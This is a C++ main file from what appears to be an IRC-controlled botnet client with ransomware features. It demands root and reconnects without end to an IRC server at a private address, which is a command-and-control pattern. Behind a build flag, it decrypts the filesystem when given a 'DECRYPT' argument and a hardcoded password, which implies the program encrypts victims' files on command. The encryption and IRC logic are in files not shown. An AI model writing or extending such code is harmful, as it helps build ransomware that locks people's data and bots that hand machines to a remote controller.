#include "IrcClient.hpp"
#ifdef ENABLE_ENCRYPT_ACTION
#include "FileSystemDecryptor.hpp"
#include "GeneralUtils.hpp"
#endif
#include <csignal>
#include <iostream>
#include <unistd.h>

// VERY TEMP, there will be a means implemented to get validation to decrypt files via confirmation from IRC server
const char* STORED_PASS = "UnhackablePassword123!";

void ensureRootPrivileges() {
    if (geteuid() != 0) {
        std::cerr << "This program must be run as root. Please use sudo." << std::endl;
        exit(1);
    }
}


#ifdef ENABLE_ENCRYPT_ACTION
void attemptFsDecryption(int argc, char* argv[]) {
    if (argc != 3) {
        return;
    }

    if (!GeneralUtils::cStrAreEqual(argv[1], "DECRYPT")) {
        return;
    }

    if (!GeneralUtils::cStrAreEqual(argv[2], STORED_PASS)) { // VERY TEMP
        return;
    }

    FileSystemDecryptor::decryptFileSystem(GeneralUtils::getFileBaseName(argv[0]));
    exit(0);
}
#endif

int main(int argc, char* argv[]) {
    ensureRootPrivileges();
    #ifdef ENABLE_ENCRYPT_ACTION
    attemptFsDecryption(argc, argv);
    #endif

    signal(SIGINT, IrcClient::signalHandler);
    signal(SIGTERM, IrcClient::signalHandler);
    const char* exeName = argv[0];
    while(true) {
        try {
            IrcClient client("192.168.1.127", 6667, exeName);
            client.connect();
        } catch (const std::exception& ex) {
            std::cerr << "Error: " << ex.what() << std::endl;
        }
    }

    return 0;
}
